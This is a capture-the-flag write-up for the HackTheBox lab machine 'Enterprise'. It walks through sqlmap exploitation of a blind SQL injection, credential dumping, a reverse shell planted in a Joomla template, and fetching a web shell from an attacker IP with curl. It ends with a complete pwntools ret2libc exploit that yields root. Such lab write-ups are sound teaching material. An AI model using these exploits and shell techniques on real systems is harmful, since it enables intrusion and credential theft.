

![1](</Writeups/Machines/Enterprise/img/logo.png>)
By Rug4lo

## Reconnaissance

We start with the typical [[Nmap]] scan to discover the ports, and then we will use nmap's basic reconnaissance scripts against each discovered port (in my case I am using the -oN parameter to leave a file with the scan information)

```bash
nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10.10.10.61
```
```bash
# Nmap 7.94SVN scan initiated Thu Mar 21 17:26:58 2024 as: nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10.10.10.61
Nmap scan report for 10.10.10.61
Host is up (0.16s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-generator: WordPress 4.8.1
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
| tls-alpn: 
|_  http/1.1
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.10 (Debian)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
32812/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|     Enter Bridge Access Code: 
|     Invalid Code
|     Terminating Console
|   NULL: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|_    Enter Bridge Access Code:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port32812-TCP:V=7.94SVN%I=7%D=3/21%Time=65FC5FD9%P=x86_64-pc-linux-gnu%
SF:r(NULL,ED,"\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x2
SF:0\x20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x
SF:20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Com
SF:puter\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Acc
SF:ess\x20Code:\x20\n")%r(GenericLines,110,"\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20_____
SF:_\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x2
SF:0\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|_____
SF:_\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|
SF:\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\
SF:x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sy
SF:stem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTerm
SF:inating\x20Console\n\n")%r(GetRequest,110,"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20___
SF:___\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\
SF:x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|___
SF:___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20
SF:\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcom
SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
SF:rminating\x20Console\n\n")%r(HTTPOptions,110,"\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20
SF:______\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x
SF:20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|
SF:______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\
SF:x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWel
SF:come\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\
SF:x20System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\
SF:nTerminating\x20Console\n\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 21 17:27:17 2024 -- 1 IP address (1 host up) scanned in 18.56 seconds
```
We can see that there are 3 web pages on this machine, and besides that there is a port 32812 running a custom program called lcars (we can connect to this port with net-cat)

Let's open each page and inspect them with whatweb, with that we will see that there is a base Apache, a wordpress and a joomla 
```bash
whatweb http://enterprise.htb
```

We are going to start by inspecting the Apache, since it seems to be the simplest one, first we will use dirsearch to see the site's directories
```bash
dirsearch -u https://enterprise.htb/
```
```bash

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/rugalo/Desktop/rugalo/maquinas/htb/linux/Enterprise/nmap/reports/https_enterprise.htb/__24-03-24_15-34-51.txt

Target: https://enterprise.htb/

[15:34:51] Starting: 
[15:34:57] 403 -  301B  - /.ht_wsr.txt
[15:34:57] 403 -  304B  - /.htaccess.bak1
[15:34:57] 403 -  304B  - /.htaccess.orig
[15:34:57] 403 -  306B  - /.htaccess.sample
[15:34:57] 403 -  304B  - /.htaccess.save
[15:34:57] 403 -  304B  - /.htaccess_orig
[15:34:57] 403 -  302B  - /.htaccessBAK
[15:34:57] 403 -  302B  - /.htaccess_sc
[15:34:57] 403 -  305B  - /.htaccess_extra
[15:34:57] 403 -  302B  - /.htaccessOLD
[15:34:57] 403 -  303B  - /.htaccessOLD2
[15:34:57] 403 -  295B  - /.html
[15:34:57] 403 -  301B  - /.httr-oauth
[15:34:57] 403 -  294B  - /.htm
[15:34:57] 403 -  304B  - /.htpasswd_test
[15:34:57] 403 -  300B  - /.htpasswds
[15:34:59] 403 -  294B  - /.php
[15:34:59] 403 -  295B  - /.php3
[15:36:29] 301 -  318B  - /files  ->  https://enterprise.htb/files/
[15:36:29] 200 -  457B  - /files/
[15:37:06] 403 -  303B  - /server-status
[15:37:06] 403 -  304B  - /server-status/
```
With this we are going to see that there is a /files, if we browse into this subdirectory, we will see this:

![1](</Writeups/Machines/Enterprise/img/1.png>)

This lcars.zip file is interesting, we can download it and unzip it, this will give us three files

![1](</Writeups/Machines/Enterprise/img/2.png>)

If we look at the first file we will see that these php files belong to a plugin, most likely a WordPress one

![1](</Writeups/Machines/Enterprise/img/3.png>)

The two remaining files look like the files that define how the plugin works

lcars_db.php

![1](</Writeups/Machines/Enterprise/img/4.png>)

lcars_dbpost.php

![1](</Writeups/Machines/Enterprise/img/5.png>)

If we inspect them we will see that they use a MySQL query which is not sanitized in the **lcars_db.php** file

So we can try to reach the files on the WordPress site

![1](</Writeups/Machines/Enterprise/img/6.png>)

We see that we are able to reach them, so we can try injecting some id (since this script supposedly gives you a user's data by their id)

![1](</Writeups/Machines/Enterprise/img/7.png>)

We see that it is not working, but we can try a SQLI, in this case I am trying to see if it gives me a 5 second delay when reloading the page

![1](</Writeups/Machines/Enterprise/img/8.png>)

We will see how the page takes the 5 seconds to respond, so it is vulnerable to SQLI, but if we start trying to list the databases we will see that it doesn't render any information, so it is very likely a time-based Blind SQLI

For this we could write a python script, but it is going to be very slow, so we can use Sqlmap to list the databases
```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch
```
```bash
available databases [8]:
[*] information_schema
[*] joomla
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
[*] wordpressdb
```
We can see a lot of databases, but the ones we care about are joomladb and wordpress (since the others are empty,) so we will go ahead and dump all the tables of the joomladb database 
```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch -dbms mysql -D joomladb --tables
```
```bash
| edz2g_ucm_content             |
| edz2g_ucm_history             |
| edz2g_update_sites            |
| edz2g_update_sites_extensions |
| edz2g_updates                 |
| edz2g_user_keys               |
| edz2g_user_notes              |
| edz2g_user_profiles           |
| edz2g_user_usergroup_map      |
| edz2g_usergroups              |
| edz2g_users                   |
| edz2g_utf8_conversion         |
| edz2g_viewlevels              |
+-------------------------------+
```
We see the edz2g_users database so we are going to list all of its information
```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch -dbms mysql -D joomladb -T edz2g_users --columns
```
```bash
+---------------+---------------+
| Column        | Type          |
+---------------+---------------+
| block         | tinyint(4)    |
| name          | varchar(400)  |
| activation    | varchar(100)  |
| email         | varchar(100)  |
| id            | int(11)       |
| lastResetTime | datetime      |
| lastvisitDate | datetime      |
| otep          | varchar(1000) |
| otpKey        | varchar(1000) |
| params        | text          |
| password      | varchar(100)  |
| registerDate  | datetime      |
| requireReset  | tinyint(4)    |
| resetCount    | int(11)       |
| sendEmail     | tinyint(4)    |
| username      | varchar(150)  |
+---------------+---------------+
```
```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch -dbms mysql -D joomladb -T edz2g_users --columns -C email,name,username,password --dump
```
```bash
+--------------------------------+------------+-----------------+--------------------------------------------------------------+
| email                          | name       | username        | password                                                     |
+--------------------------------+------------+-----------------+--------------------------------------------------------------+
| geordi.la.forge@enterprise.htb | Super User | geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy |
| guinan@enterprise.htb          | Guinan     | Guinan          | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q |
+--------------------------------+------------+-----------------+--------------------------------------------------------------+
```
Now we will do the same with the "wordpress" database, and we will get this:
```bash
+----+------------------------------+---------------+------------------------------------+
| 1  | william.riker@enterprise.htb | william.riker | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. |
+----+------------------------------+---------------+------------------------------------+
```
We can try to crack the passwords with John but we won't get anywhere, at this point we can keep digging through the databases, until we find a table in the "wodpress" database called "wp_posts", if we look at all the information of the posts in that table we will end up finding an interesting post
```bash
Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n   
```
If we clean it up a bit we will see that we have several passwords, which together with the users we have found we now have a chance to try
```bash
Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6   
```
We will find that the Joomla (the site on port 8080) has an /admin and this combination will work
```bash
geordi.la.forge : ZD3YxfnSjezg67JZ
```
Perfect, once inside the admin panel we can get a reverse shell the typical way in Joomla, we go to Templates and modify the one in use, error.php, and there we put whatever php command we want, such as the reverse shell, we start listening with net-cat and save

![1](</Writeups/Machines/Enterprise/img/9.png>)

When we request a page that does not exist we will get the error page and the command will be executed, so we will receive the reverse shell on our machine

![1](</Writeups/Machines/Enterprise/img/10.png>)

![1](</Writeups/Machines/Enterprise/img/11.png>)

We have the shell, but we can see that we are in a container
```
hostname -I
```
If we start digging we will see that in /var/www/html there is a /files directory

Which has the same content as the Apache server had in its /files, so we can assume that there is a mount to the main machine in that directory

![1](</Writeups/Machines/Enterprise/img/12.png>)

Thanks to this we can drop a php file into this directory that gives us a reverse shell when we browse to it (in my case I am using p0wny-shell since it looks nicer)

p0wny-shell repository --> https://github.com/flozz/p0wny-shell

```bash
curl http://10.10.14.18/shell.php -o ./shell.php
```
We browse to the file from the Apache machine

![1](</Writeups/Machines/Enterprise/img/13.png>)

![1](</Writeups/Machines/Enterprise/img/14.png>)

Alright, now we send ourselves the reverse shell again to gain access to the main machine

![1](</Writeups/Machines/Enterprise/img/15.png>)

Now that we have access to the main machine we remember that on port 32812 there was a custom application, we can look for a binary named lcars
```bash
find / -iname lcars 2>/dev/null
```
```bash
/etc/xinetd.d/lcars
/bin/lcars
```
We have the binary, we can download it and run it to see if it is the same one running on port 32812

![1](</Writeups/Machines/Enterprise/img/16.png>)

It is indeed the same one, but it asks us for a password, we can use ltrace to see whether it does the comparison unobfuscated at code level

![1](</Writeups/Machines/Enterprise/img/17.png>)

Perfect, we have the password, if we use it we will get a menu, we can try stuffing a lot of "A"s into the fields to see if an error comes up

![1](</Writeups/Machines/Enterprise/img/18.png>)

Perfect, we get an error when going into menu 4 and inserting a lot of "A"s in the input, now we can try with gdb-peda to see if it has any security feature disabled 

peda repository --> https://github.com/longld/peda
```bash
gdb ./lcars -q
```
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : Partial
```
We see that PIE is enabled so it won't be possible for us to do a stack-based BoF, but since NX is not enabled we can try a ret2libc 

In a ret2libc what we do is overwrite EIP so that it points to the address of system, then points to the address of exit and finally to an address holding the string /bin/sh 

It would be something like this: EIP --> System() --> Exit --> /bin/sh

Let's get to the good part, first we are going to calculate the offset up to EIP (the number of characters we need to overwrite EIP), for this we will use gdb-peda's pattern create
```bash
gdb-peda$ pattern create 1000
```
And we will enter this pattern instead of the "A"s

![1](</Writeups/Machines/Enterprise/img/19.png>)

With the comparator we can see the offset
```
gdb-peda$ pattern offset $eip
%$A% found at offset: 212
```
We have the offset, now we have to find the addresses of system, exit and sh

To see the address of system we will have to run gdb (on the Enterprise machine). First we have to list the functions
```bash
(gdb) info functions
```
Now we have to set a breakpoint on the main function
```bash
(gdb) b *main
```
We run the program `(gdb) r`  and list the system function

![1](</Writeups/Machines/Enterprise/img/20.png>)

We will do the same for exit

![1](</Writeups/Machines/Enterprise/img/21.png>)

Perfect, now all we need is the string with sh, for this we will just have to run `find &system,+9999999,"sh"` (any of the addresses will do)

![1](</Writeups/Machines/Enterprise/img/22.png>)

Now we have everything we need, so we can build the script (remembering that the addresses have to be in little endian, and everything in bytes format so python3 doesn't blow up), I did it this way
```python
#!/usr/bin/python3

import time
from pwn import *

## BoF Creation

offset = 212
before_eip = b"A" * offset

Fsystem = p32(0xf7e4c060) 
Fexit = p32(0xf7e3faf0)
Fshell = p32(0xf7f6ddd5)

payload = before_eip + Fsystem + Fexit + Fshell

context(os='linux', arch='i386')
host, port = "10.10.10.61", 32812

## Conection to the machine

time.sleep(1)

r = remote(host, port)

## Recive and sending data

r.recvuntil(b"Enter Bridge Access Code:")
r.sendline(b"picarda1")
r.recvuntil(b"Waiting for input:")
r.sendline(b"4")
r.recvuntil(b"Enter Security Override:")
r.sendline(payload)

time.sleep(1)

## spawn the shell

r.interactive()
```
With this, if we run the script we will see how we gain access to the machine as the root user